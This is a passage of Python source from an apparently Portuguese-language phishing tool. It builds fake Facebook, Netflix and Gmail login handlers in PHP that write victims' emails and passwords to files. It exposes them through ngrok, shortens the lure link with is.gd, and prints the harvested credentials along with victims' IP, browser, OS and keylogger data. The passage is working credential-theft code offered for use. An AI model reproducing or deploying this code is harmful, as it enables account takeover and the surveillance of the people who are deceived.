   elif (template_phishing == "facebook"): #Phishing Facebook
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/facebook/login.php")
       os.system("touch templates/facebook/login.php")
       url_destiny = open("templates/facebook/login.php", "w")
       conteudo = ('''<?php
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: %s');
exit();''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       os.popen("cd templates/facebook && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       time.sleep(2.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor Ngrok Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Localhost: " + G + "http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/facebook/ip.txt")
               verificar_credenciais = os.path.exists("templates/facebook/usernames.txt")
               verificar_keylogger = os.path.exists("templates/facebook/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo foi fisgado no Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de login do alvo no Phishing:", hora_atual)
                 os.system("mv templates/facebook/ip.txt templates/facebook/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/facebook/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/facebook/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 try:
                   arquivo_dados = open("templates/facebook/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Email Facebook: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/facebook/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[1])
                     user_agent = str(conteudo_rede[3])
                     sistema_alvo = str(conteudo_rede[5])
                     versao_sistema = str(conteudo_rede[6])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/facebook/ip_log.txt templates/facebook/logs > /dev/null 2>&1")
                     os.popen("cp templates/facebook/usernames.txt templates/facebook/logs > /dev/null 2>&1")
                     os.popen("touch templates/facebook/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/facebook/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/facebook/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/facebook/ip_log.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/facebook/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/facebook/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/facebook/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/facebook/KeyloggerData.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
                   time.sleep(2.5)
                   os.popen("rm templates/facebook/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/facebook/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/facebook/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/facebook/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
           else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/facebook/ip.txt")
               verificar_credenciais = os.path.exists("templates/facebook/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo foi fisgado no Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de login do alvo no Phishing:", hora_atual)
                 os.system("mv templates/facebook/ip.txt templates/facebook/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 try:
                   arquivo_dados = open("templates/facebook/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Email Facebook: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/facebook/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[1])
                     user_agent = str(conteudo_rede[3])
                     sistema_alvo = str(conteudo_rede[5])
                     versao_sistema = str(conteudo_rede[6])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/facebook/ip_log.txt templates/netflix/logs > /dev/null 2>&1")
                     os.popen("cp templates/facebook/usernames.txt templates/netflix/logs > /dev/null 2>&1")
                     os.popen("touch templates/facebook/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/facebook/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/facebook/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/facebook/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/facebook/KeyloggerData.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/facebook/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/facebook/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/facebook/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/facebook/KeyloggerData.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
                   time.sleep(2.5)
                   os.popen("rm templates/facebook/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/facebook/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/facebook/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/facebook/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
       else:
         banner_program()
         print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
         print ("\n" + W + "[" + R + "●" + W + "]" + C + " Servidor Ngrok Falhou" + A + R + " OFF")
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

   elif (template_phishing == "netflix"): #Phishing Netflix
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/netflix/login.php")
       os.system("touch templates/netflix/login.php")
       url_destiny = open("templates/netflix/login.php", "w")
       conteudo = ('''<?php
file_put_contents("usernames.txt", "Usuario: " . $_POST['email'] . " Senha: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: %s');
exit();''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       os.popen("cd templates/netflix && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       time.sleep(2.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor Ngrok Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Localhost: " + G + "http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/netflix/ip.txt")
               verificar_credenciais = os.path.exists("templates/netflix/usernames.txt")
               verificar_keylogger = os.path.exists("templates/netflix/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/netflix/ip.txt templates/netflix/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/netflix/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/netflix/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 arquivo_dados = open("templates/netflix/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + A + " Email Netflix: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 time.sleep(1.2)
                 try:
                   arquivo_rede = open("templates/netflix/ip_log.txt", "r")
                   dados_de_rede = arquivo_rede.read()
                   conteudo_rede = dados_de_rede.split()
                   endereco_ip = str(conteudo_rede[1])
                   user_agent = str(conteudo_rede[3])
                   sistema_alvo = str(conteudo_rede[5])
                   versao_sistema = str(conteudo_rede[6])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                   arquivo_rede.close()
                   print ("\n" + A + G + "═════════════════════════════════════")
                   os.popen("cp templates/netflix/ip_log.txt templates/netflix/logs > /dev/null 2>&1")
                   os.popen("cp templates/netflix/usernames.txt templates/netflix/logs > /dev/null 2>&1")
                   os.popen("touch templates/netflix/logs/Data.txt > /dev/null 2>&1")
                   os.popen("(date +'%x => %X') > templates/netflix/logs/Data.txt")
                   time.sleep(0.5)
                   os.popen("rm templates/netflix/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/netflix/ip_log.txt > /dev/null 2>&1")
                   stop()
                   break
                 except FileNotFoundError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                   os.popen("rm templates/netflix/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/netflix/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/netflix/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/netflix/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   time.sleep(2.5)
                   stop()
           else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/netflix/ip.txt")
               verificar_credenciais = os.path.exists("templates/netflix/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/netflix/ip.txt templates/netflix/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 arquivo_dados = open("templates/netflix/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + A + " Email Netflix: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 time.sleep(1.2)
                 try:
                   arquivo_rede = open("templates/netflix/ip_log.txt", "r")
                   dados_de_rede = arquivo_rede.read()
                   conteudo_rede = dados_de_rede.split()
                   endereco_ip = str(conteudo_rede[1])
                   user_agent = str(conteudo_rede[3])
                   sistema_alvo = str(conteudo_rede[5])
                   versao_sistema = str(conteudo_rede[6])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                   arquivo_rede.close()
                   print ("\n" + A + G + "═════════════════════════════════════")
                   os.popen("cp templates/netflix/ip_log.txt templates/netflix/logs > /dev/null 2>&1")
                   os.popen("cp templates/netflix/usernames.txt templates/netflix/logs > /dev/null 2>&1")
                   os.popen("touch templates/netflix/logs/Data.txt > /dev/null 2>&1")
                   os.popen("(date +'%x => %X') > templates/netflix/logs/Data.txt")
                   time.sleep(0.5)
                   os.popen("rm templates/netflix/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/netflix/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/netflix/KeyloggerData.txt > /dev/null 2>&1")
                   stop()
                   break
                 except FileNotFoundError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                   os.popen("rm templates/netflix/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/netflix/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/netflix/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/netflix/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   time.sleep(2.5)
                   stop()
       else:
         banner_program()
         print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
         print ("\n" + W + "[" + R + "●" + W + "]" + C + " Servidor Ngrok Falhou" + A + R + " OFF")
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

   elif (template_phishing == "gmail"): #Phishing Gmail
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/gmail/login.php")
       os.system("touch templates/gmail/login.php")
       url_destiny = open("templates/gmail/login.php", "w")
       conteudo = ('''<?php
include 'ip.php';
                        session_start();

                        $pass = $_POST["password"];
                        $email=$_SESSION["Email"];


                        file_put_contents("usernames.txt", "EMAIL: " . " ". $email . " " . " " . "PASS: " . " " . $pass . "\n", FILE_APPEND);
                        header('Location: %s');
                        exit();


                        session_destroy();

?>''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       os.popen("cd templates/gmail && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       time.sleep(2.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor Ngrok Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Localhost: " + G + "http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/gmail/ip.txt")
               verificar_credenciais = os.path.exists("templates/gmail/usernames.txt")
               verificar_keylogger = os.path.exists("templates/gmail/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo foi fisgado no Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de login do alvo no Phishing:", hora_atual)
                 os.system("mv templates/gmail/ip.txt templates/gmail/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/gmail/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/gmail/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 try:
                   arquivo_dados = open("templates/gmail/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Email Gmail: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/gmail/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[1])
                     user_agent = str(conteudo_rede[3])
                     sistema_alvo = str(conteudo_rede[5])
                     versao_sistema = str(conteudo_rede[6])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Alvo: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/gmail/ip_log.txt templates/gmail/logs > /dev/null 2>&1")
                     os.popen("cp templates/gmail/usernames.txt templates/gmail/logs > /dev/null 2>&1")
                     os.popen("touch templates/gmail/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/gmail/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/gmail/usernames.txt > /dev/null 2>&1")
